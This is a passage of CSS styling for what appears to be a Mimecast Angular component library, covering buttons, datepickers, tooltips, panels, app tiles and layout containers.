            border-color: #B2B2B2;
        }

        .btn-secondary:focus,
        .btn-secondary.focus {
            color: #333333;
            background-color: #f0f0f0;
            border-color: #B2B2B2;
            z-index: 3;
        }

        .btn-secondary:hover {
            color: #333333;
            background-color: #f0f0f0;
            border-color: #B2B2B2;
        }

        .btn-secondary:active,
        .btn-secondary.active,
        .open>.btn-secondary.dropdown-toggle {
            color: #333333;
            background-color: #e6e5e5;
            background-image: none;
            border-color: #B2B2B2;
        }

        .btn-secondary:active:hover,
        .btn-secondary:active:focus,
        .btn-secondary:active.focus,
        .btn-secondary.active:hover,
        .btn-secondary.active:focus,
        .btn-secondary.active.focus,
        .open>.btn-secondary.dropdown-toggle:hover,
        .open>.btn-secondary.dropdown-toggle:focus,
        .open>.btn-secondary.dropdown-toggle.focus {
            color: #333333;
            background-color: #e6e5e5;
            border-color: #B2B2B2;
        }

        .btn-secondary.disabled:hover,
        .btn-secondary.disabled:focus,
        .btn-secondary.disabled.focus,
        .btn-secondary[disabled]:hover,
        .btn-secondary[disabled]:focus,
        .btn-secondary[disabled].focus,
        fieldset[disabled] .btn-secondary:hover,
        fieldset[disabled] .btn-secondary:focus,
        fieldset[disabled] .btn-secondary.focus {
            background-color: #FFFFFF;
            border-color: #B2B2B2;
        }

        .btn-secondary .badge {
            color: #FFFFFF;
            background-color: #333333;
        }

        .btn-subtle {
            color: #333333;
            background-color: transparent;
            border-color: transparent;
        }

        .btn-subtle:focus,
        .btn-subtle.focus {
            color: #333333;
            background-color: #E5E5E5;
            border-color: rgba(0, 0, 0, 0);
            z-index: 3;
        }

        .btn-subtle:hover {
            color: #333333;
            background-color: #E5E5E5;
            border-color: rgba(0, 0, 0, 0);
        }

        .btn-subtle:active,
        .btn-subtle.active,
        .open>.btn-subtle.dropdown-toggle {
            color: #333333;
            background-color: #E5E5E5;
            background-image: none;
            border-color: rgba(0, 0, 0, 0);
        }

        .btn-subtle:active:hover,
        .btn-subtle:active:focus,
        .btn-subtle:active.focus,
        .btn-subtle.active:hover,
        .btn-subtle.active:focus,
        .btn-subtle.active.focus,
        .open>.btn-subtle.dropdown-toggle:hover,
        .open>.btn-subtle.dropdown-toggle:focus,
        .open>.btn-subtle.dropdown-toggle.focus {
            color: #333333;
            background-color: #E5E5E5;
            border-color: rgba(0, 0, 0, 0);
        }

        .btn-subtle.disabled:hover,
        .btn-subtle.disabled:focus,
        .btn-subtle.disabled.focus,
        .btn-subtle[disabled]:hover,
        .btn-subtle[disabled]:focus,
        .btn-subtle[disabled].focus,
        fieldset[disabled] .btn-subtle:hover,
        fieldset[disabled] .btn-subtle:focus,
        fieldset[disabled] .btn-subtle.focus {
            background-color: transparent;
            border-color: transparent;
        }

        .btn-subtle .badge {
            color: transparent;
            background-color: #333333;
        }

        .btn-secondary.mc-floating {
            color: #333333;
            background-color: #FFFFFF;
            border-color: transparent;
        }

        .btn-secondary.mc-floating:focus,
        .btn-secondary.mc-floating.focus {
            color: #333333;
            background-color: #f0f0f0;
            border-color: transparent;
            z-index: 3;
        }

        .btn-secondary.mc-floating:hover {
            color: #333333;
            background-color: #f0f0f0;
            border-color: transparent;
        }

        .btn-secondary.mc-floating:active,
        .btn-secondary.mc-floating.active,
        .open>.btn-secondary.mc-floating.dropdown-toggle {
            color: #333333;
            background-color: #e6e5e5;
            background-image: none;
            border-color: transparent;
        }

        .btn-secondary.mc-floating:active:hover,
        .btn-secondary.mc-floating:active:focus,
        .btn-secondary.mc-floating:active.focus,
        .btn-secondary.mc-floating.active:hover,
        .btn-secondary.mc-floating.active:focus,
        .btn-secondary.mc-floating.active.focus,
        .open>.btn-secondary.mc-floating.dropdown-toggle:hover,
        .open>.btn-secondary.mc-floating.dropdown-toggle:focus,
        .open>.btn-secondary.mc-floating.dropdown-toggle.focus {
            color: #333333;
            background-color: #e6e5e5;
            border-color: transparent;
        }

        .btn-secondary.mc-floating.disabled:hover,
        .btn-secondary.mc-floating.disabled:focus,
        .btn-secondary.mc-floating.disabled.focus,
        .btn-secondary.mc-floating[disabled]:hover,
        .btn-secondary.mc-floating[disabled]:focus,
        .btn-secondary.mc-floating[disabled].focus,
        fieldset[disabled] .btn-secondary.mc-floating:hover,
        fieldset[disabled] .btn-secondary.mc-floating:focus,
        fieldset[disabled] .btn-secondary.mc-floating.focus {
            background-color: #FFFFFF;
            border-color: transparent;
        }

        .btn-secondary.mc-floating .badge {
            color: #FFFFFF;
            background-color: #333333;
        }

        .btn-secondary.mc-combo.active,
        .btn-secondary.mc-combo:active {
            background-color: inherit;
            color: inherit;
        }

        .mc-floating {
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        .mc-floating:focus,
        .mc-floating:active {
            box-shadow: none, 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        @media all and (max-width: 480px) {
            .btn-block-xs {
                display: block;
                text-align: center;
                width: 100%;
                margin-top: 0.5rem;
            }

            .btn-block-xs:first-child {
                margin-top: 0;
            }
        }

        .btn-sm,
        .btn-group-sm>.btn,
        .btn-xs,
        .btn-group-xs>.btn {
            font-weight: 500;
        }

        .mc-action-list-dropdown-button .btn-primary:last-of-type {
            border-left-width: 0;
            margin-left: 1px !important;
        }

        .btn-group,
        .btn-group-vertical {
            border-radius: 4px;
        }

        .btn-group.mc-floating,
        .btn-group-vertical.mc-floating {
            box-shadow: none;
        }

        .form-control {
            box-shadow: none;
        }

        .form-control:focus {
            box-shadow: none;
        }

        .has-error .form-control:focus {
            box-shadow: none;
        }

        .form-group p.help-block {
            color: #999999;
        }

        .has-error .form-control:focus {
            border-color: #d63636;
        }

        .help-block {
            font-size: 14px;
        }

        label.control-label {
            color: #666666;
        }

        @media (min-width: 768px) {
            .form-horizontal .control-label.align-top {
                padding-top: 0;
            }

            .form-horizontal .control-label.align-switch {
                padding-top: 3px;
            }
        }

        .panel {
            box-shadow: none;
            margin-bottom: 15px;
            border-width: 1px;
        }

        .panel-heading {
            font-size: 17px;
            font-weight: 400;
        }

        .panel-footer {
            background-color: transparent;
            border-top: none;
            text-align: right;
        }

        .panel-padding-top {
            padding-top: 15px;
        }

        .panel-padding-bottom {
            padding-bottom: 15px;
        }

        .panel-padding-left {
            padding-left: 15px;
        }

        .panel-padding-right {
            padding-right: 15px;
        }

        .panel-half-padding-top {
            padding-top: 7.5px;
        }

        .panel-half-padding-bottom {
            padding-bottom: 7.5px;
        }

        .panel-half-padding-right {
            padding-right: 7.5px;
        }

        .panel-half-padding-left {
            padding-left: 7.5px;
        }

        .panel-margin-top {
            margin-top: 15px;
        }

        .panel-half-margin-top {
            margin-top: 7.5px;
        }

        .panel-half-margin-top-negative {
            margin-top: -7.5px;
        }

        .panel-double-margin-top {
            margin-top: 30px;
        }

        .panel-margin-left {
            margin-left: 15px;
        }

        .panel-half-margin-left {
            margin-left: 7.5px;
        }

        .panel-margin-right {
            margin-right: 15px;
        }

        .panel-half-margin-right {
            margin-right: 7.5px;
        }

        .panel-margin-bottom {
            margin-bottom: 15px;
        }

        .panel-half-margin-bottom {
            margin-bottom: 7.5px;
        }

        .panel-double-padding-top {
            padding-top: 30px;
        }

        .panel-double-padding-bottom {
            padding-bottom: 30px;
        }

        .d-inline-block {
            display: inline-block !important;
        }

        .d-flex {
            display: flex !important;
        }

        .d-block {
            display: block !important;
        }

        .d-inline-block {
            display: inline-block !important;
        }

        .text-center {
            text-align: center !important;
        }

        .justify-content-between {
            justify-content: space-between !important;
        }

        .no-margin-bottom {
            margin-bottom: 0 !important;
        }

        ngb-datepicker {
            border: none !important;
        }

        ngb-datepicker:focus {
            outline: none !important;
        }

        ngb-datepicker .ngb-dp-header {
            height: 70px !important;
            margin-bottom: -30px !important;
            background-color: transparent !important;
            border-bottom: none !important;
        }

        ngb-datepicker .ngb-dp-months {
            margin-top: 2.5px !important;
        }

        ngb-datepicker-month-view .ngb-dp-weekdays {
            border-bottom: none !important;
        }

        .ngb-dp-week .ngb-dp-day,
        .ngb-dp-week .ngb-dp-weekday,
        .ngb-dp-week .ngb-dp-week-number {
            width: 29px !important;
            height: 29px !important;
            font-size: 14px !important;
            color: #666666 !important;
            border-radius: 4px !important;
        }

        .ngb-dp-week .ngb-dp-day:focus,
        .ngb-dp-week .ngb-dp-weekday:focus,
        .ngb-dp-week .ngb-dp-week-number:focus {
            outline: 0 !important;
            box-shadow: none !important;
        }

        .ngb-dp-weekday,
        .ngb-dp-week-number {
            font-weight: 700 !important;
            font-style: normal !important;
        }

        .ngb-dp-navigation-chevron {
            color: #666666 !important;
            vertical-align: middle !important;
            width: 7px !important;
            height: 7px !important;
            border-width: 2px 2px 0 0 !important;
        }

        .ngb-dp-arrow {
            width: 29px !important;
            height: 29px !important;
        }

        .ngb-dp-arrow .ngb-dp-navigation-chevron {
            margin-left: 4px !important;
            margin-right: 0 !important;
        }

        .ngb-dp-arrow.right .ngb-dp-navigation-chevron {
            margin-left: -3px !important;
        }

        .ngb-dp-navigation-select {
            flex-basis: 100% !important;
            margin: 0 10px !important;
        }

        .ngb-dp-arrow-btn {
            width: 29px !important;
            height: 29px !important;
            border-radius: 4px !important;
            margin: 0 !important;
        }

        .ngb-dp-arrow-btn:hover {
            background-color: #F2F2F2 !important;
        }

        .ngb-dp-arrow-btn:focus {
            outline: inherit !important;
        }

        [ngbDatepickerDayView] {
            width: 29px !important;
            height: 29px !important;
            line-height: 29px !important;
            border-radius: 4px !important;
            text-align: center !important;
            display: inline-block !important;
            color: #333333 !important;
            background-color: transparent !important;
            border-color: transparent !important;
        }

        [ngbDatepickerDayView]:hover {
            background-color: #F2F2F2 !important;
        }

        [ngbDatepickerDayView].active {
            background-color: #F2F2F2 !important;
        }

        [ngbDatepickerDayView].bg-primary {
            background-color: #ef6421 !important;
            color: #FFFFFF !important;
        }

        .custom-select {
            max-width: 100% !important;
            color: #666666 !important;
            vertical-align: middle !important;
            border: 1px solid #CCCCCC !important;
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            appearance: none !important;
            padding: 5px !important;
            font-size: 14px !important;
            line-height: 1 !important;
            height: 29px !important;
            width: 50% !important;
            border-radius: 4px !important;
            background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3E%3Cpath fill='%23333' d='M2 0L0 2h4zm0 5L0 3h4z'/%3E%3C/svg%3E") !important;
            background-position: right 0.75rem center;
            background-repeat: no-repeat;
            background-size: 8px 10px !important;
        }

        .custom-select:focus {
            outline: 0 !important;
            box-shadow: none !important;
        }

        .custom-select:first-child {
            margin-right: 5px !important;
        }

        .custom-select:last-child {
            margin-left: 5px !important;
        }

        .dropdown-menu {
            margin-top: 5px;
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        .dropdown-menu .dropdown-header {
            font-weight: 600;
        }

        .h-xxl,
        .h-xl,
        .h-lg,
        .h-md,
        .h-sm,
        .h-xs,
        .h-xxs {
            font-weight: 400;
        }

        .h-xxl {
            font-size: 29px;
        }

        .h-xl {
            font-size: 29px;
        }

        .h-lg {
            font-size: 23px;
        }

        .h-md {
            font-size: 17px;
        }

        .h-sm {
            font-size: 13px;
        }

        .h-xs {
            font-size: 11px;
        }

        .h-xxs {
            font-size: 11px;
            font-weight: 400;
        }

        .text-muted {
            color: #666666;
        }

        .table.borderless>thead>tr>th,
        .table.borderless>thead>tr>td,
        .table.borderless>tbody>tr>th,
        .table.borderless>tbody>tr>td,
        .table.borderless>tfoot>tr>th,
        .table.borderless>tfoot>tr>td {
            border-style: none;
        }

        .table.borderless>thead>tr>th,
        .table.borderless>tbody>tr>th,
        .table.borderless>tfoot>tr>th {
            color: #333333;
        }

        .h-full {
            height: 100%;
        }

        .w-full {
            width: 100%;
        }

        @media (max-width: 767px) {
            .text-center-xs {
                text-align: center;
            }
        }

        .no-select {
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        .col-no-padding {
            padding-left: 0 !important;
            padding-right: 0 !important;
        }

        .h-box {
            display: table;
            width: 100%;
        }

        @media (max-width: 767px) {

            .h-box.auto-xs,
            .h-box.auto-xs .col {
                display: block;
            }
        }

        .h-box .col {
            display: table-cell;
        }

        .v-top {
            vertical-align: top;
        }

        .v-middle {
            vertical-align: middle;
        }

        .v-bottom {
            vertical-align: bottom;
        }

        .mc-detailed-list p {
            font-size: 1.3em;
            line-height: 1.7em;
        }

        .mc-detailed-list .mc-detailed-list-row {
            display: flex;
            padding: 7.5px 0;
            line-height: 1.5em;
        }

        .mc-detailed-list .mc-detailed-list-row .mc-detailed-list-label {
            font-weight: 600;
            text-align: right;
            flex: 0 0 auto;
            color: #666666;
        }

        .mc-detailed-list .mc-detailed-list-row .mc-detailed-list-column {
            box-sizing: border-box;
            flex: 1 1 10%;
            padding: 0 15px;
            word-wrap: break-word;
            word-break: break-word;
        }

        .mc-detailed-list.mc-detailed-list-two-columns .mc-detailed-list-row *:nth-child(3) {
            display: none;
        }

        .mc-detailed-list.mc-detailed-list-hide-first-column .mc-detailed-list-row .mc-detailed-list-column:nth-child(2) {
            display: none;
        }

        ngb-tooltip-window.tooltip {
            position: absolute;
            z-index: 1070;
            display: block;
            margin: 0;
            font-size: 14px;
            word-wrap: break-word;
            opacity: 0;
        }

        ngb-tooltip-window.tooltip.show {
            opacity: 1;
        }

        ngb-tooltip-window.tooltip .arrow {
            position: absolute;
            display: block;
            width: 5px;
            height: 5px;
        }

        ngb-tooltip-window.tooltip .arrow::before {
            position: absolute;
            border-color: transparent;
            border-style: solid;
        }

        ngb-tooltip-window.tooltip .tooltip-inner {
            max-width: 200px;
            padding: 3px 8px;
            color: #fff;
            text-align: center;
            background-color: #000;
            border-radius: 4px;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-top,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='top'] {
            padding: 5px 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-top .arrow,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='top'] .arrow {
            bottom: 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-top .arrow::before,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='top'] .arrow::before {
            margin-left: -3px;
            content: '';
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-right,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='right'] {
            padding: 0 5px;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-right .arrow,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='right'] .arrow {
            left: 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-right .arrow::before,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='right'] .arrow::before {
            margin-top: -3px;
            content: '';
            border-width: 5px 5px 5px 0;
            border-right-color: #000;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-bottom,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='bottom'] {
            padding: 5px 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-bottom .arrow,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='bottom'] .arrow {
            top: 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-bottom .arrow::before,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='bottom'] .arrow::before {
            margin-left: -3px;
            content: '';
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-left,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='left'] {
            padding: 0 5px;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-left .arrow,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='left'] .arrow {
            right: 0;
        }

        ngb-tooltip-window.tooltip.bs-tooltip-left .arrow::before,
        ngb-tooltip-window.tooltip.bs-tooltip-auto[x-placement^='left'] .arrow::before {
            right: 0;
            margin-top: -3px;
            content: '';
            border-width: 5px 0 5px 5px;
            border-left-color: #000;
        }

        .mc-bg-light {
            background-color: #F2F2F2;
        }

        .mc-header-bg {
            background-color: #576b7c;
        }

        .mc-border {
            border: 1px solid;
        }

        .mc-border-0 {
            border: none;
        }

        .mc-border-top-0 {
            border-top: none;
        }

        .mc-border-right-0 {
            border-right: none;
        }

        .mc-border-bottom-0 {
            border-bottom: none;
        }

        .mc-border-left-0 {
            border-left: none;
        }

        .popover {
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
            border: 1px solid #CCCCCC;
        }

        .popover .popover-arrow.arrow {
            margin-left: 0 !important;
            border-top-color: #CCCCCC;
        }

        .popover.mc-field-help-popover {
            max-width: 230px;
        }

        .popover.mc-field-help-popover .popover-content {
            padding: 7.5px 15px;
        }

        .badge.mc-tag-dangerous {
            background: #d63636;
        }

        .badge.mc-tag-warning {
            background: #ffcc00;
        }

        .badge.mc-tag-info {
            background: #3a98d8;
        }

        .badge.mc-tag-success {
            background: #50b450;
        }

        /**
  Classic theme for Angular components
 */
        /**
  Mimecast UI Angular components theme

  All the angular components that requires any selector to be themed
  must add a reference to the ".theme.scss" file here.
 */
        @keyframes pulse_v2 {
            50% {
                fill: #333333;
            }

            to {
                fill: #333333;
                opacity: 0.3;
            }
        }

        @keyframes inverted_pulse_v2 {
            50% {
                fill: #ffffff;
            }

            to {
                fill: #ffffff;
                opacity: 0.3;
            }
        }

        @media (max-width: 767px) {
            mc-access-denied-message {
                flex-direction: column;
            }
        }

        mc-access-denied-message .icon-area {
            margin-right: 30px;
        }

        mc-access-denied-message .title,
        mc-access-denied-message .description {
            margin-bottom: 30px;
        }

        mc-access-denied-message .description,
        mc-access-denied-message .login-link {
            font-size: 17px;
        }

        mc-app-tile {
            width: 165px;
            height: 172px;
            border-radius: 4px;
        }

        mc-app-tile .flip-container .mc-flippable {
            border-radius: 4px;
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
            color: #333333;
            height: 100%;
            width: 100%;
        }

        mc-app-tile .flip-container .mc-front .mc-info-icon {
            color: #ef6421;
        }

        mc-app-tile .flip-container .mc-back {
            width: 248px;
            height: 258px;
            margin-top: -43px;
            margin-left: -41.25px;
            border-radius: 4px;
            box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
        }

        @media screen and (max-width: 450px) and (min-width: 420px) {
            mc-app-tile .flip-container .mc-back {
                width: 202.95px;
                height: 211.56px;
                margin-top: -20.14857143px;
                margin-left: -19.32857143px;
            }
        }

        mc-app-tile .flip-container .mc-back .mc-back-to-app {
            width: 40px;
            height: 40px;
            border-bottom-right-radius: 4px;
            background: linear-gradient(-45deg, #ef6421 50%, transparent 50%);
        }

        mc-tile-back .mc-back-text-container .mc-info-heading {
            font-size: 11px;
            font-weight: 600;
            line-height: 1.1;
            color: #333333;
        }

        mc-tile-back .mc-back-text-container p {
            color: #333333;
            font-size: 14px;
            line-height: 1.42857143;
            font-weight: 400;
        }

        mc-tile-back .mc-launch-app {
            padding: 20px;
            font-weight: 600;
            font-size: 14px;
            line-height: 1.42857143;
            color: #333333;
        }

        mc-tile-front .mc-icon {
            width: 64px;
            height: 64px;
        }

        mc-tile-front .mc-label {
            padding: 10px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: 600;
            line-height: 1.2;
            color: #333333;
        }

        mc-tile-icon .mc-icon-wrapper {
            width: 64px;
            height: 64px;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            position: absolute;
            left: 50px;
            text-align: center;
        }

        mc-tile-launch-app-text .mc-app-tile-launch:focus {
            text-decoration: none;
            color: #333333;
        }

        mc-tile-launch-app-text .mc-app-tile-launch:hover {
            color: #0d0d0d;
            text-decoration: underline;
        }

        mc-tile-launch-app-text .mc-app-tile-launch:active {
            color: #0d0d0d;
            text-decoration: underline;
        }

        mc-account-switch-bar {
            background-color: #ffad42;
            color: #333333;
        }

        mc-account-switch-bar .mc-account-switch {
            font-weight: 400;
            font-size: 14px;
        }

        mc-aside-recipients .mc-recipients-container {
            padding: 15px;
        }

        mc-aside-recipients .mc-recipients-container .mc-body-cell.mc-column-email {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        mc-aside-recipients .mc-recipients-container mc-filter-search {
            display: block;
            padding-bottom: 15px;
        }

        mc-aside-recipients .mc-recipients-container .mc-status-remediated {
            color: #50b450;
        }

        mc-aside-recipients .mc-recipients-container .mc-status-remediate_failure,
        mc-aside-recipients .mc-recipients-container .mc-status-restore_failure {
            color: #d63636;
        }

        mc-aside-recipients .mc-no-data {
            padding: 15px;
        }

        mc-collapsable-panel .mc-collapsable-panel .mc-collapsable-panel-header {
            padding: 0 15px;
            font-size: 17px;
            font-weight: 700;
        }

        mc-collapsable-panel .mc-collapsable-panel .mc-collapsable-panel-caret {
            color: #666666;
            width: 15px;
        }

        mc-collapsable-panel .mc-show-more i {
            font-size: inherit;
        }

        mc-date-picker ngb-datepicker {
            padding: 7.5px !important;
            border: 1px solid #CCCCCC !important;
            border-radius: 6px;
        }

        mc-calendar-date-picker mc-modal-header {
            border-radius: 6px 6px 0 0;
        }

        mc-calendar-date-picker .calendar-label {
            border-bottom: 1px solid #CCCCCC;
        }

        mc-calendar-date-picker .calendar-wrapper {
            max-width: 203px;
        }

        mc-calendar-date-picker .panel {
            border-radius: 6px;
        }

        mc-dropdown-item a.dropdown-item {
            color: #333333;
        }

        mc-dropdown-item a.dropdown-item:hover {
            background-color: #F2F2F2;
            color: #262626;
        }

        mc-list-dropdown-button .mc-meatballs i {
            background: #333333;
        }

        mc-list-dropdown-button:hover .mc-meatballs i {
            background-color: #1A1A1A;
        }

        mc-empty-results .mc-empty-results .mc-empty-wrapper {
            text-align: center;
            padding: 60px 15px;
        }

        mc-empty-results .mc-empty-results .mc-empty-wrapper .mc-empty-results-icon {
            font-size: 60px;
            color: #999999;
            padding-bottom: 15px;
        }

        mc-empty-results .mc-empty-results .mc-empty-wrapper .mc-empty-title {
            font-size: 17px;
            font-weight: 400;
            padding-bottom: 3.75px;
        }

        mc-empty-results .mc-empty-results .mc-empty-wrapper .mc-empty-body-container {
            font-size: 13px;
            font-weight: 400;
        }

        mc-empty-results .mc-empty-results .mc-empty-wrapper .mc-empty-body-container .mc-link {
            text-decoration: underline;
            cursor: pointer;
        }

        mc-feedback-badge .feedback-badge {
            padding: 5px 30px 3.5px 10px;
            min-height: 43px;
        }

        mc-feedback-badge .feedback-badge>.text {
            max-width: 540px;
        }

        mc-feedback-badge .text {
            font-size: 15px;
        }

        mc-feedback-badge .loader {
            border-top-color: #3a98d8 !important;
        }

        @media (max-width: 350px) {
            mc-feedback-badge .feedback-badge-loaded>span.text {
                max-width: 230px;
            }
        }

        @media (min-width: 350px) and (max-width: 480px) {
            mc-feedback-badge .feedback-badge-loaded>span.text {
                max-width: 270px;
            }
        }

        mc-feedback-badge .badge-bg-success {
            background-color: #B9E1B9;
        }

        mc-feedback-badge .badge-bg-warning {
            background-color: #FFEA99;
        }

        mc-feedback-badge .badge-bg-info {
            background-color: #EBF4FB;
        }

        mc-feedback-badge .badge-bg-danger {
            background-color: #EEAEAE;
        }

        mc-feedback-badge .badge-text-success {
            color: #306C30;
        }

        mc-feedback-badge .badge-text-warning {
            color: #665100;
        }

        mc-feedback-badge .badge-text-info {
            color: #225B81;
        }

        mc-feedback-badge .badge-text-danger {
            color: #802020;
        }

        mc-filter-search .mc-filter-search input:focus {
            border-color: #CCCCCC;
        }

        mc-filter-search .mc-filter-search .mc-icon {
            color: #666666;
        }

        mc-floating-button .btn-floating {
            color: #fff;
            background-color: #576b7c;
            border-color: #576b7c;
            border: none;
        }

        mc-floating-button .btn-floating:focus,
        mc-floating-button .btn-floating.focus {
            color: #fff;
            background-color: #4a5b6a;
            border-color: #576b7c;
            z-index: 3;
        }

        mc-floating-button .btn-floating:hover {
            color: #fff;
            background-color: #4a5b6a;
            border-color: #576b7c;
        }

        mc-floating-button .btn-floating:active,
        mc-floating-button .btn-floating.active,
        .open>mc-floating-button .btn-floating.dropdown-toggle {
            color: #fff;
            background-color: #42515e;
            background-image: none;
            border-color: #576b7c;
        }

        mc-floating-button .btn-floating:active:hover,
        mc-floating-button .btn-floating:active:focus,
        mc-floating-button .btn-floating:active.focus,
        mc-floating-button .btn-floating.active:hover,
        mc-floating-button .btn-floating.active:focus,
        mc-floating-button .btn-floating.active.focus,
        .open>mc-floating-button .btn-floating.dropdown-toggle:hover,
        .open>mc-floating-button .btn-floating.dropdown-toggle:focus,
        .open>mc-floating-button .btn-floating.dropdown-toggle.focus {
            color: #fff;
            background-color: #42515e;
            border-color: #576b7c;
        }

        mc-floating-button .btn-floating.disabled:hover,
        mc-floating-button .btn-floating.disabled:focus,
        mc-floating-button .btn-floating.disabled.focus,
        mc-floating-button .btn-floating[disabled]:hover,
        mc-floating-button .btn-floating[disabled]:focus,
        mc-floating-button .btn-floating[disabled].focus,
        fieldset[disabled] mc-floating-button .btn-floating:hover,
        fieldset[disabled] mc-floating-button .btn-floating:focus,
        fieldset[disabled] mc-floating-button .btn-floating.focus {
            background-color: #576b7c;
            border-color: #576b7c;
        }

        mc-floating-button .btn-floating .badge {
            color: #576b7c;
            background-color: #fff;
        }

        mc-floating-button .btn-floating:focus,
        mc-floating-button .btn-floating.focus {
            color: get-color("menuTextColor");
        }

        mc-floating-button .btn-floating:hover {
            color: get-color("menuTextColor");
        }

        mc-floating-button .btn-floating:active,
        mc-floating-button .btn-floating.active,
        .open>mc-floating-button .btn-floating.dropdown-toggle {
            color: get-color("menuTextColor");
        }

        mc-floating-button .btn-floating:active:hover,
        mc-floating-button .btn-floating:active:focus,
        mc-floating-button .btn-floating:active.focus,
        mc-floating-button .btn-floating.active:hover,
        mc-floating-button .btn-floating.active:focus,
        mc-floating-button .btn-floating.active.focus,
        .open>mc-floating-button .btn-floating.dropdown-toggle:hover,
        .open>mc-floating-button .btn-floating.dropdown-toggle:focus,
        .open>mc-floating-button .btn-floating.dropdown-toggle.focus {
            color: get-color("menuTextColor");
        }

        floating-button-overlay .cdk-overlay-pane.floating-button-panel floating-button-panel {
            border-radius: 6px;
        }

        mc-field .mc-popover-icon {
            color: #CCCCCC;
        }

        label {
            font-weight: 600;
        }

        mc-checkbox label.disabled {
            color: #999999;
        }

        [mc-hash-calculator-area] .mc-drop-area-info {
            height: 37px;
        }

        [mc-hash-calculator-area] .mc-hash-calculator-overlay {
            padding: 15px;
        }

        [mc-hash-calculator-area] .mc-hash-calculator-page-overlay {
            z-index: 1050;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-container,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-container,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-container,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-container,
        mc-help-container.mc-layout-v2 .mc-flex-container,
        mc-body-container.mc-layout-v2 .mc-flex-container,
        mc-extra-container.mc-layout-v2 .mc-flex-container,
        mc-side-container.mc-layout-v2 .mc-flex-container,
        mc-footer-container.mc-layout-v2 .mc-flex-container,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-container,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-container,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-container,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-container,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-container,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-container,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-container,
        mc-layout-list-table.mc-layout-v2 .mc-flex-container,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-container,
        mc-layout-list-two-columns.mc-layout-v2 .mc-flex-container,
        mc-layout-modal-simple.mc-layout-v2 .mc-flex-container {
            display: flex;
        }

        mc-layout-aside-extra-container.mc-layout-v2 .mc-flex-shrink,
        mc-layout-aside-extra-pagination-container.mc-layout-v2 .mc-flex-shrink,
        mc-layout-aside-simple.mc-layout-v2 .mc-flex-shrink,
        mc-layout-aside-tabs.mc-layout-v2 .mc-flex-shrink,
        mc-help-container.mc-layout-v2 .mc-flex-shrink,
        mc-body-container.mc-layout-v2 .mc-flex-shrink,
        mc-extra-container.mc-layout-v2 .mc-flex-shrink,
        mc-side-container.mc-layout-v2 .mc-flex-shrink,
        mc-footer-container.mc-layout-v2 .mc-flex-shrink,
        mc-layout-dashboard-simple.mc-layout-v2 .mc-flex-shrink,
        mc-layout-dashboard-tabs.mc-layout-v2 .mc-flex-shrink,
        mc-layout-detail-simple.mc-layout-v2 .mc-flex-shrink,
        mc-layout-detail-tabs.mc-layout-v2 .mc-flex-shrink,
        mc-layout-detail-wizard.mc-layout-v2 .mc-flex-shrink,
        mc-layout-list-extra-container.mc-layout-v2 .mc-flex-shrink,
        mc-layout-list-simple.mc-layout-v2 .mc-flex-shrink,
        mc-layout-list-table.mc-layout-v2 .mc-flex-shrink,
        mc-layout-list-tabs.mc-layout-v2 .mc-flex-shrink,
